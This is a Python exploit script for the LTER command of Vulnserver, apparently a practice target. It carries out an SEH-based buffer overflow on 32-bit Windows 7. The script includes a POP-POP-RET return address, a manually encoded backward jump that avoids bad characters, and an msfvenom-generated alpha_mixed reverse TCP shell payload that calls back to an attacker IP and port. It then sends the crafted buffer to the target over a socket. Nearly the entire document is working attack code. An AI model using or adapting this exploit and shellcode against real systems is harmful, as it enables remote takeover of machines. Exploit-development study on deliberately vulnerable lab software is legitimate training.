# Vulnserver LTER command - SEH based buffer overflow exploit
# Tested on Windows 7 (build 7601) 32 bit

import socket

host = "172.16.24.235"        # Target IP
port = 9999                   # Target port

RET = "\x2b\x17\x50\x62"      # Address where POP, POP, RET sequence is found
JMP_FWD = "\x76\x08\x77\x04"  # Safety net to jump over SEH

# Since characters from 80 till FF are bad chars, in order to jump back we need to manually encode jump opcodes

# ESP value at beginng:  016CECA4
# Highest stack address: 016CFFFF
# Payload begins at:     016CF209

# Stack alignment
# push esp; pop eax; add ax, 0x565; push eax; pop ebx; add ax, 0x0d77; add al, 0x74; push eax; pop esp;
# \x54\x58\x66\x05\x65\x05\x50\x5b\x66\x05\x7f\x0D\x04\x74\x50\x5c

# After stack alignment:
# ESP - pointing to end of stack
# EBX - points to the beginning of payload

# In order to manually encode jump opcodes by using SUB instruction, first we need to clear eax
# and eax, 0x50505050
# and eax, 0x01010101
# \x25\x50\x50\x50\x50\x25\x01\x01\x01\x01

# encode jmp ebx (\xff\xe3)
#\xff\xe3\x90\x90
#0 - 9090e3ff = 0x6F6F1C01
#A	B	C	D
#(1)01	77	77	13
#1c	10	06	05  *(1b = 1c-1)
#6f	60	09	06
#6f	60	09	06

#sub eax, 0x60601077
#sub eax, 0x09090677
#sub eax, 0x06060513

#\x2D\x77\x10\x60\x60\x2D\x77\x06\x09\x09\x2D\x13\x05\x06\x06\x50

# When we put it all together:

JMP_BCK =  "\x54\x58\x66\x05\x65\x05\x50\x5b\x66\x05\x7f\x0D\x04\x74\x50\x5c"
JMP_BCK += "\x25\x50\x50\x50\x50\x25\x01\x01\x01\x01"
JMP_BCK += "\x2D\x77\x10\x60\x60\x2D\x77\x06\x09\x09\x2D\x13\x05\x06\x06\x50"

#msfvenom -p windows/shell_reverse_tcp LHOST=172.16.24.204 LPORT=444 BufferRegister=EBX -a x86 -f python -e x86/alpha_mixed -b "\x78\x79\x80\x7a\x7b\x7c\x7d\x7f\x0a\x0d\x00" EXITFUNC=seh
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 702 (iteration=0)
#x86/alpha_mixed chosen with final size 702
#Payload size: 702 bytes
#Final size of python file: 3413 bytes
buf =  b""
buf += b"\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += b"\x6b\x4c\x38\x68\x6d\x52\x43\x30\x73\x30\x77\x70\x33"
buf += b"\x50\x6e\x69\x6d\x35\x66\x51\x69\x50\x33\x54\x4e\x6b"
buf += b"\x36\x30\x50\x30\x6e\x6b\x33\x62\x34\x4c\x4c\x4b\x42"
buf += b"\x72\x65\x44\x6c\x4b\x33\x42\x44\x68\x44\x4f\x6f\x47"
buf += b"\x50\x4a\x44\x66\x76\x51\x6b\x4f\x4e\x4c\x55\x6c\x61"
buf += b"\x71\x33\x4c\x74\x42\x56\x4c\x57\x50\x6b\x71\x48\x4f"
buf += b"\x66\x6d\x53\x31\x4f\x37\x68\x62\x4a\x52\x70\x52\x66"
buf += b"\x37\x4e\x6b\x62\x72\x72\x30\x6c\x4b\x61\x5a\x57\x4c"
buf += b"\x4e\x6b\x42\x6c\x46\x71\x74\x38\x68\x63\x30\x48\x57"
buf += b"\x71\x6b\x61\x30\x51\x4c\x4b\x70\x59\x61\x30\x76\x61"
buf += b"\x69\x43\x4e\x6b\x57\x39\x52\x38\x5a\x43\x76\x5a\x30"
buf += b"\x49\x4e\x6b\x47\x44\x6e\x6b\x55\x51\x6b\x66\x36\x51"
buf += b"\x39\x6f\x6e\x4c\x4b\x71\x48\x4f\x34\x4d\x63\x31\x4f"
buf += b"\x37\x76\x58\x59\x70\x34\x35\x6c\x36\x44\x43\x31\x6d"
buf += b"\x49\x68\x55\x6b\x71\x6d\x45\x74\x73\x45\x58\x64\x33"
buf += b"\x68\x6c\x4b\x76\x38\x64\x64\x57\x71\x4a\x73\x42\x46"
buf += b"\x4e\x6b\x36\x6c\x52\x6b\x6c\x4b\x76\x38\x37\x6c\x43"
buf += b"\x31\x58\x53\x6c\x4b\x53\x34\x6c\x4b\x65\x51\x4a\x70"
buf += b"\x4b\x39\x33\x74\x65\x74\x57\x54\x53\x6b\x61\x4b\x31"
buf += b"\x71\x43\x69\x50\x5a\x73\x61\x49\x6f\x6b\x50\x63\x6f"
buf += b"\x73\x6f\x70\x5a\x6c\x4b\x67\x62\x58\x6b\x4e\x6d\x71"
buf += b"\x4d\x43\x58\x35\x63\x36\x52\x37\x70\x47\x70\x53\x58"
buf += b"\x33\x47\x61\x63\x55\x62\x33\x6f\x61\x44\x72\x48\x32"
buf += b"\x6c\x72\x57\x55\x76\x53\x37\x49\x6f\x58\x55\x4f\x48"
buf += b"\x4a\x30\x47\x71\x45\x50\x75\x50\x66\x49\x6b\x74\x51"
buf += b"\x44\x30\x50\x63\x58\x44\x69\x6f\x70\x70\x6b\x43\x30"
buf += b"\x39\x6f\x38\x55\x50\x50\x72\x70\x46\x30\x42\x70\x73"
buf += b"\x70\x56\x30\x61\x50\x32\x70\x52\x48\x4a\x4a\x34\x4f"
buf += b"\x59\x4f\x4b\x50\x39\x6f\x4a\x75\x6f\x67\x73\x5a\x74"
buf += b"\x45\x33\x58\x6e\x4c\x42\x30\x62\x38\x5a\x6c\x50\x68"
buf += b"\x36\x62\x55\x50\x66\x61\x4d\x6c\x4c\x49\x39\x76\x30"
buf += b"\x6a\x44\x50\x53\x66\x72\x77\x72\x48\x6f\x69\x59\x35"
buf += b"\x63\x44\x33\x51\x6b\x4f\x68\x55\x6c\x45\x59\x50\x51"
buf += b"\x64\x44\x4c\x39\x6f\x32\x6e\x74\x48\x44\x35\x6a\x4c"
buf += b"\x65\x38\x38\x70\x4e\x55\x6c\x62\x72\x76\x4b\x4f\x49"
buf += b"\x45\x73\x58\x31\x73\x62\x4d\x45\x34\x63\x30\x4d\x59"
buf += b"\x39\x73\x66\x37\x63\x67\x51\x47\x50\x31\x4c\x36\x62"
buf += b"\x4a\x42\x32\x31\x49\x72\x76\x69\x72\x49\x6d\x72\x46"
buf += b"\x49\x57\x67\x34\x37\x54\x57\x4c\x43\x31\x37\x71\x6c"
buf += b"\x4d\x63\x74\x74\x64\x36\x70\x39\x56\x67\x70\x52\x64"
buf += b"\x51\x44\x46\x30\x56\x36\x46\x36\x53\x66\x71\x56\x46"
buf += b"\x36\x42\x6e\x76\x36\x66\x36\x46\x33\x36\x36\x43\x58"
buf += b"\x52\x59\x68\x4c\x45\x6f\x6f\x76\x49\x6f\x69\x45\x4e"
buf += b"\x69\x49\x70\x32\x6e\x73\x66\x33\x76\x59\x6f\x76\x50"
buf += b"\x35\x38\x76\x68\x6f\x77\x67\x6d\x71\x70\x6b\x4f\x4e"
buf += b"\x35\x4f\x4b\x6b\x4e\x34\x4e\x75\x62\x68\x6a\x43\x58"
buf += b"\x4c\x66\x4c\x55\x6f\x4d\x6f\x6d\x49\x6f\x59\x45\x67"
buf += b"\x4c\x63\x36\x43\x4c\x64\x4a\x6f\x70\x69\x6b\x39\x70"
buf += b"\x34\x35\x44\x45\x4f\x4b\x57\x37\x54\x53\x50\x72\x52"
buf += b"\x4f\x73\x5a\x35\x50\x42\x73\x69\x6f\x39\x45\x41\x41"

buffer = "LTER /.:/" + buf + (3519-len(JMP_FWD)-len(buf)) * "A" + JMP_FWD + RET + "BB" + JMP_BCK  + "B" * (5000-4-2-len(JMP_FWD)-len(buf))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()
